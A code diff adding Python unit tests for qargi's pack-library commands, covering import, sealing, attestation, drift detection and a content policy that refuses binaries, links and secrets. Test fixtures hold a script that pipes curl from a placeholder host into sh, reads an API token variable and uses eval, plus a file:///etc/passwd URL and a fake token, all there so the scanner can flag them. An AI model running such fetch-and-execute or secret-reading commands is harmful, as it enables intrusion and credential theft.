@@ -1922,6 +1922,631 @@ class SealedPacks(V2Tree):
 
 
 
+# ---- the library verbs: new, import, seal, check, attest, remove, enable, disable ------------------------------------------------
+
+def jread(path):
+    with open(path) as f:
+        return json.load(f)
+
+
+def jwrite(path, obj):
+    with open(path, "w") as f:
+        json.dump(obj, f)
+
+
+def fread(path):
+    with open(path) as f:
+        return f.read()
+
+
+def fwrite(path, text):
+    with open(path, "w") as f:
+        f.write(text)
+
+
+
+SKILLS_RES = {"skills": {"project_dir": ".fake/skills", "items": "dir-per-item", "entry": "SKILL.md", "format": "skill-md",
+                         "link": {"project": "dir-symlink", "user": "none"}}}
+RENDERER = "#!/usr/bin/env python3\nimport json, sys\nd = json.load(sys.stdin)[\"definition\"]\nprint(\"---\\nname: %s\\n---\\n\\n%s\" % (d[\"name\"], d.get(\"body\", \"\")))\n"
+
+
+def fake_runtime(name="fakecli", **over):
+    """A data-only runtime that claims skills and mcp (skills has a hermetic case; mcp has none)."""
+    d = runtime(name, capabilities={"skills": {"value": "yes", "note": "n"}, "mcp": {"value": "yes"}}, resources=SKILLS_RES)
+    d.update(over)
+    return d
+
+
+class LibraryBase(unittest.TestCase):
+    """The verbs run as the command line runs them (lib/provider.py), against a temporary configuration and state."""
+
+    def setUp(self):
+        self.tmp = os.path.realpath(tempfile.mkdtemp(prefix="libverbs."))
+        self.addCleanup(shutil.rmtree, self.tmp, True)
+        self.conf, self.state, self.home, self.src = (os.path.join(self.tmp, d) for d in ("conf", "state", "home", "src"))
+        for d in (self.home, self.src):
+            os.makedirs(d)
+        self.env = {k: v for k, v in os.environ.items() if not k.startswith(("QARGI_", "ANTHROPIC_"))}
+        self.env.update(HOME=self.home, QARGI_CONF=self.conf, QARGI_STATE=self.state)
+        self.lib = os.path.join(self.conf, "packs", "providers")
+        self.patches = [mock.patch.dict(os.environ, {"QARGI_CONF": self.conf, "QARGI_STATE": self.state, "HOME": self.home})]
+        for m in self.patches:
+            m.start()
+            self.addCleanup(m.stop)
+
+    def q(self, *args):
+        r = subprocess.run([sys.executable, "-I", os.path.join(LIB, "provider.py")] + [str(a) for a in args], capture_output=True, text=True, env=self.env,
+                           stdin=subprocess.DEVNULL, cwd=self.tmp)
+        return r.returncode, r.stdout, r.stderr
+
+    def source(self, name="fakecli", doc=None, files=None, execs=()):
+        """A pack source directory: definition.json and files {relative path: text}; execs: the paths made executable."""
+        d = os.path.join(self.src, name)
+        os.makedirs(d, exist_ok=True)
+        with open(os.path.join(d, "definition.json"), "w") as f:
+            json.dump(doc if doc is not None else fake_runtime(name), f)
+        for rel, text in (files or {}).items():
+            p = os.path.join(d, rel)
+            os.makedirs(os.path.dirname(p), exist_ok=True)
+            with open(p, "wb") as f:
+                f.write(text if isinstance(text, bytes) else text.encode())
+            if rel in execs:
+                os.chmod(p, 0o755)
+        return d
+
+    def token(self, out):
+        for ln in out.splitlines():
+            if ln.startswith("plan token: "):
+                return ln.split()[2]
+        self.fail("no plan token in: " + out)
+
+    def stored(self, name):
+        return os.path.isdir(os.path.join(self.lib, name))
+
+    def apply(self, verb, *args, exec_names=None, words="go", expect=0):
+        """plan, then apply the plan the token names: returns (rc, out, err) of the apply."""
+        rc, out, err = self.q(verb, *args)
+        self.assertEqual(rc, 0, (out, err))
+        extra = ["--approve-exec", exec_names] if exec_names else []
+        r = self.q(verb, *args, "--plan", self.token(out), "--approved", words, *extra)
+        self.assertEqual(r[0], expect, r)
+        return r
+
+    def import_pack(self, source, *args, exec_names=None):
+        return self.apply("import", source, *args, exec_names=exec_names)
+
+    def record(self, name):
+        with open(os.path.join(self.lib, name, ".pack.json")) as f:
+            return json.load(f)
+
+    def eff(self, name, cap="skills"):
+        return P.effective(name, "local", cap)
+
+
+class ImportData(LibraryBase):
+    """The import of a runtime that is only data: plan, token, approval."""
+
+    def test_the_plan_stores_nothing_and_prints_the_review_and_a_token(self):
+        src = self.source()
+        rc, out, err = self.q("import", src)
+        self.assertEqual(rc, 0, err)
+        self.assertIn("== review of provider pack fakecli from " + src, out)
+        self.assertIn("executables: none", out)
+        self.assertIn("secret findings: none", out)
+        self.assertIn("skills", out)
+        self.assertIn("counts as NO until", out)
+        self.assertRegex(out, r"plan token: [0-9a-f]{12}")
+        self.assertNotIn("--approve-exec", out)
+        self.assertFalse(self.stored("fakecli"))
+        self.assertFalse(os.path.exists(os.path.join(self.state, "audit.log")))
+
+    def test_plan_then_token_then_approval_stores_a_sealed_pack_and_leaves_an_audit_line(self):
+        rc, out, err = self.import_pack(self.source())
+        self.assertIn("stored provider pack fakecli", out)
+        rec = self.record("fakecli")
+        self.assertTrue(rec["sealed"])
+        self.assertEqual((rec["kind"], rec["executables"], rec["approved"]["words"]), ("provider", {}, "go"))
+        self.assertEqual(rec["sha256"], P.tree_hash(os.path.join(self.lib, "fakecli")))
+        self.assertEqual(P.seal_state(P.entry_any("fakecli"))[0], "sealed")
+        self.assertEqual(stat.S_IMODE(os.stat(os.path.join(self.lib, "fakecli")).st_mode), 0o700)
+        rc, out, _ = self.q("list")
+        self.assertRegex(out, r"fakecli +local +\d+ warning")
+        with open(os.path.join(self.state, "audit.log")) as f:
+            line = json.loads(f.readlines()[-1])
+        self.assertEqual((line["verb"], line["approved"]), ("provider:import", "go"))
+        self.assertIn("fakecli", line["detail"])
+
+    def test_a_wrong_or_missing_token_or_no_approval_stores_nothing(self):
+        src = self.source()
+        tok = self.token(self.q("import", src)[1])
+        for args, needle in (((), "--plan is missing"), (("--plan", "0" * 12), "the plan changed")):
+            rc, out, err = self.q("import", src, "--approved", "go", *args)
+            self.assertEqual(rc, 1, err)
+            self.assertIn(needle, err)
+        rc, out, _ = self.q("import", src, "--plan", tok)                  # no --approved: still a plan
+        self.assertEqual(rc, 0)
+        self.assertIn("plan token", out)
+        self.assertFalse(self.stored("fakecli"))
+
+    def test_the_source_changing_between_plan_and_apply_stores_nothing(self):
+        src = self.source()
+        tok = self.token(self.q("import", src)[1])
+        with open(os.path.join(src, "README.md"), "w") as f:
+            f.write("added after the plan\n")
+        rc, _, err = self.q("import", src, "--plan", tok, "--approved", "go")
+        self.assertEqual(rc, 1)
+        self.assertIn("the plan changed", err)
+        self.assertFalse(self.stored("fakecli"))
+
+    def test_a_single_json_file_is_a_source_and_a_name_renames_the_definition(self):
+        f = os.path.join(self.src, "one.json")
+        with open(f, "w") as fh:
+            json.dump(fake_runtime("fakecli"), fh)
+        self.import_pack(f, "--name", "renamed")
+        self.assertEqual(jread(os.path.join(self.lib, "renamed", "definition.json"))["provider"], "renamed")
+        self.assertEqual(P.definition("renamed")["provider"], "renamed")
+
+    def test_an_unsealed_pack_is_not_a_source_of_anything_but_a_pack_from_an_https_download_is_not_fetched(self):
+        for url in ("http://example.invalid/x.json", "ssh://example.invalid/x", "file:///etc/passwd"):
+            rc, _, err = self.q("import", url)
+            self.assertEqual(rc, 2, url)
+            self.assertIn("only an https git URL", err)
+
+    def test_a_catalog_and_an_extension_are_packs_too_and_are_listed(self):
+        cat = self.source("famcat", catalog("famcat"))
+        self.import_pack(cat)
+        ext = self.source("addon", {"schema": 2, "kind": "extension", "extension": "addon", "extends": "fakecli", "provides": ["resume"],
+                                    "adds": {"capabilities": {"resume": cell("yes")}}})
+        self.import_pack(ext)
+        rc, out, _ = self.q("list")
+        self.assertRegex(out, r"famcat +catalog")
+        self.assertRegex(out, r"addon +extension")
+        self.assertEqual(P.catalog("famcat")["family"], "famcat")
+        rc, out, _ = self.q("show", "addon")
+        self.assertIn("extension addon extends fakecli", out)
+
+    def test_an_invalid_definition_is_refused_with_its_findings(self):
+        d = fake_runtime()
+        d["surface"] = "moon"
+        rc, out, err = self.q("import", self.source(doc=d))
+        self.assertEqual(rc, 1)
+        self.assertIn("FAIL: surface", out)
+        self.assertIn("refused", err)
+
+
+class Policy(LibraryBase):
+    """What a pack may hold: text only, no links, no secrets; executables approved by name."""
+
+    def refused(self, src, needle):
+        rc, out, err = self.q("import", src)
+        self.assertEqual(rc, 1, (out, err))
+        self.assertIn(needle, out)
+        rc, out, err = self.q("import", src, "--plan", "0" * 12, "--approved", "go", "--approve-exec", "adapter")
+        self.assertEqual(rc, 1)
+        self.assertFalse(self.stored("fakecli"))
+        return out
+
+    def test_a_binary_is_refused_whatever_its_name_or_mode(self):
+        for body, why in ((b"\x7fELF\x02\x01\x01" + b"\x00" * 60, "an ELF executable"), (b"MZ\x90\x00\x03" + b"\x00" * 60, "a PE executable"),
+                          (b"\xcf\xfa\xed\xfe" + b"\x00" * 60, "a Mach-O executable"), (b"PK\x03\x04" + b"x" * 40, "a zip archive"),
+                          (b"\x1f\x8b\x08\x00" + b"x" * 40, "a gzip file"), (b"plain\x00text", "binary (it has a NUL byte)"), (b"caf\xe9 not utf-8\n", "not UTF-8 text")):
+            with self.subTest(why):
+                shutil.rmtree(os.path.join(self.src, "fakecli"), True)
+                src = self.source(files={"adapter": body}, execs=("adapter",))
+                out = self.refused(src, "FAIL: adapter is " + why)
+                self.assertIn("a pack holds only text files", out)
+                self.assertIn("(NOT TEXT)", out)
+
+    def test_a_binary_data_file_is_refused_too(self):
+        self.refused(self.source(files={"data/model.bin": b"\x00\x01\x02"}), "data/model.bin is binary")
+
+    def test_a_tar_archive_and_a_symbolic_link_are_refused(self):
+        tar = b"x" * 257 + b"ustar\x0000" + b"x" * 100
+        self.refused(self.source(files={"notes.txt": tar}), "a tar archive")
+        shutil.rmtree(os.path.join(self.src, "fakecli"))
+        src = self.source()
+        os.symlink("/etc/hostname", os.path.join(src, "link"))
+        self.refused(src, "link is a symbolic link, which a pack may not hold")
+
+    def test_a_secret_is_refused_and_its_value_is_not_printed(self):
+        secret = "ghp_" + "A1b2C3d4" * 4
+        out = self.refused(self.source(files={"notes.md": "token: %s\n" % secret}), "FAIL: notes.md:1 looks like a secret (the value is not shown)")
+        self.assertNotIn(secret, out)
+
+    def test_an_executable_is_listed_with_its_hash_and_must_be_named(self):
+        src = self.source(files={"adapter": "#!/usr/bin/env python3\nprint('{}')\n"}, execs=("adapter",))
+        h = hashlib.sha256(b"#!/usr/bin/env python3\nprint('{}')\n").hexdigest()
+        rc, out, _ = self.q("import", src)
+        self.assertIn("approve each by name with --approve-exec", out)
+        self.assertIn("adapter  sha256 " + h, out)
+        self.assertIn("| #!/usr/bin/env python3", out)
+        self.assertIn("--approve-exec adapter)", out)
+        tok = self.token(out)
+        for names, needle in ((None, "does not name: adapter"), ("other", "does not name: adapter"), ("adapter,other", "names other, which is not an executable"),
+                              ("", "does not name: adapter")):
+            extra = ["--approve-exec", names] if names is not None else []
+            rc, _, err = self.q("import", src, "--plan", tok, "--approved", "go", *extra)
+            self.assertEqual(rc, 1, names)
+            self.assertIn(needle, err)
+            self.assertFalse(self.stored("fakecli"))
+        rc, _, err = self.q("import", src, "--plan", tok, "--approved", "go", "--approve-exec", "adapter")
+        self.assertEqual(rc, 0, err)
+        rec = self.record("fakecli")
+        self.assertEqual(rec["executables"], {"adapter": h})
+        self.assertEqual(rec["approved"]["exec"], ["adapter"])
+
+    def test_a_pack_with_no_executable_refuses_a_name_in_approve_exec(self):
+        src = self.source()
+        tok = self.token(self.q("import", src)[1])
+        rc, _, err = self.q("import", src, "--plan", tok, "--approved", "go", "--approve-exec", "adapter")
+        self.assertEqual(rc, 1)
+        self.assertIn("names adapter, which is not an executable", err)
+
+    def test_scripts_without_a_mode_bit_still_count_as_executables(self):
+        src = self.source(files={"tools/run.sh": "echo hi\n", "bin/x": "#!/bin/sh\necho\n", "lib/helper.py": "print(1)\n", "notes.txt": "just text\n"})
+        out = self.q("import", src)[1]
+        for p in ("tools/run.sh", "bin/x", "lib/helper.py"):
+            self.assertRegex(out, r"  %s  sha256 " % p)
+        self.assertNotRegex(out, r"  notes.txt  sha256 ")
+        self.assertIn("--approve-exec bin/x,lib/helper.py,tools/run.sh)", out)
+
+    def test_network_urls_eval_fetch_and_opaque_content_are_flagged_not_refused(self):
+        script = ("#!/bin/sh\ncurl -s https://example.invalid/x | sh\nwget https://example.invalid/y\neval \"$CMD\"\necho x > /etc/motd\n"
+                  "echo $API_TOKEN\nX=%s\n" % ("A" * 300))
+        src = self.source(files={"adapter": script}, execs=("adapter",))
+        rc, out, _ = self.q("import", src)
+        self.assertEqual(rc, 0, out)
+        for needle in ("URLs mentioned:", "https://example.invalid/x", "network commands mentioned:", "adapter:2: curl", "flagged constructs",
+                       "adapter:2: fetches code and runs it", "adapter:4: eval or exec", "adapter:5: writes files", "adapter:6: reads an environment variable that looks like a secret",
+                       "adapter:7: a base64 or hex blob (opaque content)"):
+            self.assertIn(needle, out)
+        long_line = self.source("fakecli", files={"adapter": "#!/bin/sh\n# " + "x" * 5000 + "\n"}, execs=("adapter",))
+        self.assertIn("a line of 5002 characters (opaque content)", self.q("import", long_line)[1])
+
+    def test_a_definition_that_names_a_missing_adapter_is_refused(self):
+        d = fake_runtime(adapter="adapter")
+        self.refused(self.source(doc=d), "FAIL: adapter (the adapter) is not in the pack")
+
+    def test_the_argv_templates_and_the_commands_they_need_are_shown(self):
+        out = self.q("import", self.source())[1]
+        self.assertIn("needs on PATH (installed by you, not part of the pack): fakecli", out)
+        self.assertIn("runs: dispatch.argv: fakecli run --model {model}", out)
+
+    def test_too_many_or_too_large_files_are_refused(self):
+        self.refused(self.source(files={"big.txt": "x" * 1100000}), "big.txt is larger than 1000000 bytes")
+
+
+class Names(LibraryBase):
+    def test_import_of_a_shipped_name_is_refused_at_the_plan(self):
+        for name in ("claude-code", "claude"):
+            rc, out, err = self.q("import", self.source(name, fake_runtime(name)))
+            self.assertEqual(rc, 2, (name, out))
+            self.assertIn("'%s' is a name qargi ships" % name, err)
+            self.assertNotIn("plan token", out)
+        self.assertEqual(self.q("new", "claude-code")[0], 2)
+        self.assertEqual(self.q("new", "claude")[0], 2)
+        self.assertFalse(self.stored("claude-code"))
+
+    def test_a_name_in_the_library_is_taken_and_a_bad_name_is_refused(self):
+        self.import_pack(self.source())
+        rc, _, err = self.q("import", self.source())
+        self.assertEqual(rc, 2)
+        self.assertIn("already in the library", err)
+        self.assertEqual(self.q("new", "fakecli")[0], 2)
+        for bad in ("Bad", "9x", "a_b", "x" * 41, "-x"):
+            self.assertEqual(self.q("new", bad)[0], 1, bad)
+
+    def test_a_pack_that_clashes_with_a_shipped_name_by_hand_is_defined_twice(self):
+        os.makedirs(os.path.join(self.lib, "claude-code"))
+        with open(os.path.join(self.lib, "claude-code", "definition.json"), "w") as f:
+            json.dump(fake_runtime("claude-code"), f)
+        with self.assertRaises(P.Clash):
+            P.definition("claude-code")
+        rc, _, err = self.q("seal", "claude-code")
+        self.assertEqual(rc, 2)
+        self.assertIn("defined twice", err)
+
+
+class Drift(LibraryBase):
+    """A change after the approval is drift: the pack is not used, its executables are not run, its verification is gone."""
+
+    def setUp(self):
+        super().setUp()
+        d = fake_runtime(adapter="adapter", adapter_verbs=["resolve"])
+        self.src_dir = self.source(doc=d, files={"adapter": "#!/usr/bin/env python3\nprint('{}')\n"}, execs=("adapter",))
+        self.import_pack(self.src_dir, exec_names="adapter")
+        self.pack = os.path.join(self.lib, "fakecli")
+
+    def edit(self, rel, text, mode=None):
+        p = os.path.join(self.pack, rel)
+        with open(p, "w") as f:
+            f.write(text)
+        if mode:
+            os.chmod(p, mode)
+
+    def test_a_changed_executable_is_drift_and_nothing_loads_or_runs(self):
+        self.assertEqual(P.definition("fakecli")["provider"], "fakecli")
+        copy, path = P.exec_copy("fakecli", "adapter")
+        shutil.rmtree(os.path.dirname(copy))
+        self.edit("adapter", "#!/usr/bin/env python3\nprint('changed')\n")
+        self.assertEqual(P.seal_state(P.entry_any("fakecli"))[0], "drift")
+        with self.assertRaises(P.Drift):
+            P.definition("fakecli")
+        with self.assertRaises(P.Drift):
+            P.exec_copy("fakecli", "adapter")
+        rc, out, err = self.q("show", "fakecli")
+        self.assertNotEqual(rc, 0)
+        self.assertIn("changed since it was sealed", err)
+        rc, out, _ = self.q("list")
+        self.assertRegex(out, r"fakecli .*1 failure .*changed since it was sealed")
+
+    def test_a_chmod_a_new_file_and_a_removed_file_are_drift_too(self):
+        os.chmod(os.path.join(self.pack, "adapter"), 0o600)
+        self.assertEqual(P.seal_state(P.entry_any("fakecli"))[0], "drift")
+        os.chmod(os.path.join(self.pack, "adapter"), 0o700)
+        self.assertEqual(P.seal_state(P.entry_any("fakecli"))[0], "sealed")
+        self.edit("extra.txt", "new")
+        self.assertEqual(P.seal_state(P.entry_any("fakecli"))[0], "drift")
+        os.remove(os.path.join(self.pack, "extra.txt"))
+        os.remove(os.path.join(self.pack, "adapter"))
+        self.assertEqual(P.seal_state(P.entry_any("fakecli"))[0], "drift")
+
+    def test_the_executable_hash_is_checked_on_its_own_too(self):
+        rec = self.record("fakecli")
+        rec["executables"]["adapter"] = "0" * 64
+        with open(os.path.join(self.pack, ".pack.json"), "w") as f:
+            json.dump(rec, f)
+        with self.assertRaises(P.Drift):
+            P.exec_copy("fakecli", "adapter")
+        with self.assertRaises(P.Refused):
+            P.exec_copy("fakecli", "other")
+        with self.assertRaises(P.Refused):
+            P.exec_copy("fakecli", "../adapter")
+        with self.assertRaises(P.Refused):
+            P.exec_copy("claude-code", "adapter")                    # shipped: part of the tool
+
+    def test_exec_copy_gives_a_private_copy_that_matches_the_record(self):
+        copy, path = P.exec_copy("fakecli", "adapter")
+        self.addCleanup(shutil.rmtree, os.path.dirname(copy), True)
+        self.assertEqual(P.tree_hash(copy), self.record("fakecli")["sha256"])
+        self.assertTrue(os.access(path, os.X_OK))
+        self.assertEqual(stat.S_IMODE(os.stat(os.path.dirname(copy)).st_mode), 0o700)
+        self.edit("adapter", "#!/usr/bin/env python3\nprint('changed')\n")              # the library changes: the copy is what was approved
+        self.assertIn("print('{}')", fread(path))
+
+    def test_sealing_again_needs_the_new_executable_named_and_makes_the_pack_usable(self):
+        self.edit("adapter", "#!/usr/bin/env python3\nprint('changed')\n")
+        rc, out, _ = self.q("seal", "fakecli")
+        tok = self.token(out)
+        self.assertIn("state: drift", out)
+        rc, _, err = self.q("seal", "fakecli", "--plan", tok, "--approved", "reviewed")
+        self.assertEqual(rc, 1)
+        self.assertIn("does not name: adapter", err)
+        rc, out, err = self.q("seal", "fakecli", "--plan", tok, "--approved", "reviewed", "--approve-exec", "adapter")
+        self.assertEqual(rc, 0, err)
+        self.assertEqual(P.seal_state(P.entry_any("fakecli"))[0], "sealed")
+        self.assertEqual(self.record("fakecli")["executables"]["adapter"], hashlib.sha256(b"#!/usr/bin/env python3\nprint('changed')\n").hexdigest())
+        self.assertEqual(P.definition("fakecli")["provider"], "fakecli")
+
+    def test_the_seal_plan_token_changes_with_the_content(self):
+        t1 = self.token(self.q("seal", "fakecli")[1])
+        self.assertEqual(t1, self.token(self.q("seal", "fakecli")[1]))
+        self.edit("adapter", "#!/usr/bin/env python3\nprint(1)\n")
+        self.assertNotEqual(t1, self.token(self.q("seal", "fakecli")[1]))
+        rc, _, err = self.q("seal", "fakecli", "--plan", t1, "--approved", "go", "--approve-exec", "adapter")
+        self.assertEqual(rc, 1)
+        self.assertIn("the plan changed", err)
+
+
+class Scaffold(LibraryBase):
+    def test_new_makes_an_unsealed_pack_that_cannot_be_used_until_it_is_sealed(self):
+        self.apply("new", "mine")
+        self.assertTrue(self.stored("mine"))
+        self.assertFalse(self.record("mine")["sealed"])
+        self.assertEqual(sorted(os.listdir(os.path.join(self.lib, "mine"))), [".pack.json", "README.md", "definition.json"])
+        with self.assertRaises(P.Drift):
+            P.definition("mine")
+        rc, out, _ = self.q("list")
+        self.assertRegex(out, r"mine .*not sealed")
+        self.apply("seal", "mine")
+        self.assertEqual(P.definition("mine")["provider"], "mine")
+
+    def test_every_template_and_every_kind_can_be_sealed(self):
+        for i, args in enumerate((("--from", "minimal"), ("--from", "command"), ("--from", "hook-cli"), ("--from", "claude-code"), ("--kind", "catalog"),
+                                  ("--kind", "extension"))):
+            name = "t%d" % i
+            self.apply("new", name, *args)
+            self.apply("seal", name)
+            self.assertEqual(P.seal_state(P.entry_any(name))[0], "sealed", args)
+
+    def test_from_a_provider_copies_the_definition_without_its_adapter_or_family(self):
+        self.apply("new", "mycode", "--from", "claude-code")
+        d = jread(os.path.join(self.lib, "mycode", "definition.json"))
+        self.assertEqual((d["provider"], d["family"], d.get("adapter")), ("mycode", None, None))
+        self.assertTrue(all(c["verified_on"] is None for c in d["capabilities"].values()))
+        self.assertEqual(d["models"]["pattern"], P.catalog("claude")["pattern"])
+
+    def test_usage_errors(self):
+        for args in (("new",), ("new", "a", "--kind", "widget"), ("new", "a", "--from", "claude-code", "--kind", "catalog"), ("new", "a", "--bogus"), ("import",),
+                     ("seal",), ("remove", "a", "b"), ("enable", "p"), ("attest", "x")):
+            self.assertEqual(self.q(*args)[0], 2, args)
+
+
+class Attest(LibraryBase):
+    def setUp(self):
+        super().setUp()
+        self.import_pack(self.source())
+        self.words = ("--asked", "ok to record the mcp check", "--did", "ran the mcp server once against a scratch dir", "--result", "pass",
+                      "--cost-cents", "0", "--cleanup", "scratch dir removed")
+
+    def test_without_the_facts_it_prints_the_ask_and_records_nothing(self):
+        rc, out, _ = self.q("attest", "fakecli", "mcp")
+        self.assertEqual(rc, 0)
+        for needle in ("asked EACH TIME", "never pre-approved", "never runs or spends anything", "the exact command or API calls", "the smallest model and effort",
+                       "the hard ceiling", "how the scratch resources are cleaned up", "nothing is recorded and nothing was run"):
+            self.assertIn(needle, out)
+        self.assertFalse(os.path.exists(os.path.join(self.state, "providers", "fakecli")))
+        rc, out, err = self.q("attest", "fakecli", "mcp", "--asked", "yes")
+        self.assertEqual(rc, 2)
+        self.assertIn("missing: --did, --result, --cost-cents, --cleanup", err)
+
+    def test_the_plan_then_the_token_and_the_words_record_it_for_this_content_only(self):
+        rc, out, err = self.q("attest", "fakecli", "mcp", *self.words)
+        self.assertEqual(rc, 0, err)
+        self.assertIn("cost 0 cents", out)
+        self.assertIn("any edit makes it stale", out)
+        tok = self.token(out)
+        self.assertFalse(os.path.exists(os.path.join(self.state, "providers", "fakecli")))
+        rc, _, err = self.q("attest", "fakecli", "mcp", *self.words, "--approved", "go")
+        self.assertEqual(rc, 1)
+        self.assertIn("--plan is missing", err)
+        self.assertEqual(self.eff("fakecli", "mcp"), "no")
+        rc, out, err = self.q("attest", "fakecli", "mcp", *self.words, "--plan", tok, "--approved", "go on")
+        self.assertEqual(rc, 0, err)
+        rec = jread(os.path.join(self.state, "providers", "fakecli", "verified.json"))["mcp"]
+        self.assertEqual((rec["by"], rec["cost_cents"], rec["cleanup"], rec["approved"], rec["hash"]),
+                         ("attest", 0, "scratch dir removed", "go on", P.definition_hash("fakecli")))
+        self.assertEqual(self.eff("fakecli", "mcp"), "yes")
+        with open(os.path.join(self.state, "audit.log")) as f:
+            self.assertEqual(json.loads(f.readlines()[-1])["verb"], "provider:attest")
+
+    def test_a_failed_check_proves_nothing_and_removes_an_earlier_record(self):
+        self.apply("attest", "fakecli", "mcp", *self.words)
+        self.assertEqual(self.eff("fakecli", "mcp"), "yes")
+        fail = list(self.words)
+        fail[fail.index("pass")] = "fail"
+        self.apply("attest", "fakecli", "mcp", *fail)
+        self.assertEqual(self.eff("fakecli", "mcp"), "no")
+
+    def test_an_attest_goes_stale_with_an_edit_of_the_content(self):
+        self.apply("attest", "fakecli", "mcp", *self.words)
+        self.assertEqual(self.eff("fakecli", "mcp"), "yes")
+        p = os.path.join(self.lib, "fakecli", "definition.json")
+        d = jread(p); d["description"] = "edited"; jwrite(p, d)
+        self.apply("seal", "fakecli")
+        self.assertEqual(self.eff("fakecli", "mcp"), "no")
+
+    def test_it_refuses_what_it_cannot_bind(self):
+        for args, rc in ((("fakecli", "resume"), 1), (("fakecli", "nosuchcap"), 1), (("claude-code", "skills"), 2), (("nopack", "mcp"), 1)):
+            self.assertEqual(self.q("attest", *args, *self.words)[0], rc, args)
+        self.apply("new", "scratch")
+        self.assertEqual(self.q("attest", "scratch", "mcp", *self.words)[0], 2)         # an unsealed pack
+        self.assertEqual(self.q("attest", "fakecli", "mcp", "--asked", "x", "--did", "y", "--result", "maybe", "--cost-cents", "0", "--cleanup", "z")[0], 2)
+        self.assertEqual(self.q("attest", "fakecli", "mcp", "--asked", "x", "--did", "y", "--result", "pass", "--cost-cents", "-3", "--cleanup", "z")[0], 2)
+
+    def test_it_makes_no_network_call_and_runs_no_command(self):
+        src = fread(os.path.join(HERE, "..", "lib", "conformance", "library.py"))
+        body = src[src.index("def cmd_attest"):src.index("# ---- list, show for the packs")]
+        for banned in ("subprocess", "socket", "urllib", "requests", "http.client", "os.system", "Popen"):
+            self.assertNotIn(banned, body)
+
+
+class RemoveEnable(LibraryBase):
+    def setUp(self):
+        super().setUp()
+        self.import_pack(self.source())
+        os.makedirs(os.path.join(self.conf, "projects"))
+        self.project("alpha", {"models": {"provider": {"local": "fakecli"}}})
+        ext = self.source("addon", {"schema": 2, "kind": "extension", "extension": "addon", "extends": "fakecli", "provides": ["resume"],
+                                    "adds": {"capabilities": {"resume": cell("yes")}, "adapter_verbs": {"resume": "verbs/resume"}}},
+                          files={"verbs/resume": "#!/bin/sh\necho {}\n"}, execs=("verbs/resume",))
+        self.import_pack(ext, exec_names="verbs/resume")
+
+    def project(self, name, answers):
+        """Answers `qargi project set` accepts (a valid project), with the models of `answers`."""
+        base = {"schema": 1, "project": name, "repo": {"url": "https://example.invalid/r.git", "path": "", "credential_file": "", "long_lived": ["master"]},
+                "roles": {"build": {"base": "@dispatcher", "push": {"mode": "none"}, "model": "claude-sonnet-5-5", "effort": "high", "apt": [], "skills": []}},
+                "models": {}, "memory": {"memory_store": "", "reference_store": "", "tiers": {}}, "budget_cents": 500}
+        base["models"] = answers.get("models", {})
+        with open(os.path.join(self.conf, "projects", name + ".json"), "w") as f:
+            json.dump(base, f)
+
+    def answers(self, name="alpha"):
+        return jread(os.path.join(self.conf, "projects", name + ".json"))
+
+    def test_remove_is_refused_while_a_project_runs_it(self):
+        rc, _, err = self.q("remove", "fakecli")
+        self.assertEqual(rc, 1)
+        self.assertIn("project alpha runs it", err)
+        self.assertTrue(self.stored("fakecli"))
+
+    def test_remove_is_refused_while_an_extension_extends_it_or_a_runtime_takes_its_models(self):
+        self.project("alpha", {"models": {"provider": {"local": "other"}}})
+        rc, _, err = self.q("remove", "fakecli")
+        self.assertEqual(rc, 1)
+        self.assertIn("extension addon extends it", err)
+        self.import_pack(self.source("famcat", catalog("famcat")))
+        d = fake_runtime("usesit", models={"catalog": "famcat", "use": "id"})
+        self.import_pack(self.source("usesit", d))
+        rc, _, err = self.q("remove", "famcat")
+        self.assertEqual(rc, 1)
+        self.assertIn("runtime usesit takes its models from it", err)
+
+    def test_remove_is_a_plan_then_removes_the_pack_and_its_verification(self):
+        self.project("alpha", {"models": {"provider": {"local": "other"}}})
+        self.q("remove", "addon")                                                    # plan only
+        self.assertTrue(self.stored("addon"))
+        self.apply("remove", "addon")
+        self.assertFalse(self.stored("addon"))
+        P.record_verification("fakecli", {"skills": {"hash": "h", "by": "conformance", "at": "t", "note": ""}})
+        self.assertTrue(os.path.isdir(os.path.join(self.state, "providers", "fakecli")))
+        self.project("alpha", {"models": {}})
+        self.apply("remove", "fakecli")
+        self.assertFalse(self.stored("fakecli"))
+        self.assertFalse(os.path.exists(os.path.join(self.state, "providers", "fakecli")))
+        with open(os.path.join(self.state, "audit.log")) as f:
+            self.assertEqual([json.loads(ln)["verb"] for ln in f if '"provider:remove"' in ln], ["provider:remove", "provider:remove"])
+        rc, out, err = self.q("remove", "claude-code")
+        self.assertEqual(rc, 2)
+        self.assertIn("shipped with qargi", err)
+
+    def test_enable_is_its_own_plan_names_the_executables_and_records_the_extension(self):
+        rc, out, err = self.q("enable", "alpha", "addon")
+        self.assertEqual(rc, 0, err)
+        self.assertIn("verbs/resume  sha256", out)
+        self.assertIn("models.extensions of project alpha becomes [\"addon\"]", out)
+        self.assertEqual(self.answers()["models"].get("extensions"), None)
+        tok = self.token(out)
+        rc, _, err = self.q("enable", "alpha", "addon", "--plan", tok, "--approved", "go")
+        self.assertEqual(rc, 1)
+        self.assertIn("does not name: verbs/resume", err)
+        rc, out, err = self.q("enable", "alpha", "addon", "--plan", tok, "--approved", "go", "--approve-exec", "verbs/resume")
+        self.assertEqual(rc, 0, err)
+        self.assertEqual(self.answers()["models"]["extensions"], ["addon"])
+        self.assertIn("nothing to do", self.q("enable", "alpha", "addon")[1])
+        self.apply("disable", "alpha", "addon")
+        self.assertEqual(self.answers()["models"]["extensions"], [])
+        self.assertIn("nothing to do", self.q("disable", "alpha", "addon")[1])
+
+    def test_enable_refuses_what_is_not_sealed_not_an_extension_or_not_for_the_projects_runtime(self):
+        self.assertEqual(self.q("enable", "alpha", "fakecli")[0], 1)
+        self.assertEqual(self.q("enable", "nosuch", "addon")[0], 1)
+        self.assertEqual(self.q("enable", "alpha", "claude")[0], 1)
+        self.project("beta", {"models": {"provider": {"local": "claude-code"}}})
+        rc, _, err = self.q("enable", "beta", "addon")
+        self.assertEqual(rc, 2)
+        self.assertIn("extends fakecli; project beta runs claude, claude-code", err)
+        p = os.path.join(self.lib, "addon", "definition.json")
+        d = jread(p); d["description"] = "edited"; jwrite(p, d)
+        rc, _, err = self.q("enable", "alpha", "addon")
+        self.assertEqual(rc, 2)
+        self.assertIn("changed since it was sealed", err)
+
+    def test_an_extension_that_does_not_provide_what_it_adds_is_refused(self):
+        bad = {"schema": 2, "kind": "extension", "extension": "badext", "extends": "fakecli", "provides": ["resume", "mcp"], "adds": {"capabilities": {"resume": cell("yes")}}}
+        rc, out, _ = self.q("import", self.source("badext", bad))
+        self.assertEqual(rc, 1)
